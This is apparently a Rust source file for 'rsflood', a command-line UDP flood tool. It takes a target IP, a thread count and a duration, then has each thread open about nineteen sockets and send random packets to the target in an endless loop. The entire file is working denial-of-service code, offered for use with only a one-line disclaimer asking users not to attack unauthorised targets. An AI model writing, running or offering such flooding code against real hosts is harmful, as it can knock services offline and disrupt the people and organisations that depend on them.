use std::env;
use std::net::UdpSocket;
use std::process::exit;
use std::thread;
use std::time;

use rand::Rng;

fn new_socket(host: &str, port: u32) -> UdpSocket {
    let socket = UdpSocket::bind(format!("0.0.0.0:{}", port)).unwrap();

    socket.connect(host).unwrap();
    return socket;
}

fn log(msg: &str) {
    println!("[rsflood] {}", msg);
}

fn main() {
    let args: Vec<_> = env::args().collect();
    log("rslflood - Made by Celesian");
    log("don't use this tool on any not allowed applications, please.");
    if args.len() > 2 {
        log(&*format!("Starting attack against {}...", args[1]));

        let num_threads = args[2].to_string().parse::<i32>().unwrap();
        let time = args[3].to_string().parse::<u64>().unwrap();
        let host = args[1].to_string();
        let mut port: u32 = 40000;
        log("Starting threads...");
        for thread_num in 1..num_threads + 1 {
            port = port.clone() + 30;
            let host = format!("{}:{}", host.clone(), port);
            thread::spawn(move || {
                log(format!("Starting simulated attack on thread {}...", thread_num).as_str());
                let mut port = port.clone() + 1;
                let mut socket_list = Vec::new();
                for _ in 1..20 {
                    port = port.clone() + 1;
                    let socket = new_socket(host.as_str(), port);
                    socket_list.push(socket);
                }

                let msg = rand::thread_rng().gen::<[u8; 32]>();
                loop {
                    for socket in &socket_list {
                        socket.send(&msg).unwrap();
                    }
                }
            });
        }

        log("All threads were created.");
        if time == 0 {
            loop {}
        } else {
            thread::sleep(time::Duration::new(time, 0));
            exit(0);
        }
    } else {
        log(&*format!("{} ip number_of_threads time(0 for infinite)", args[0]))
    }
}	
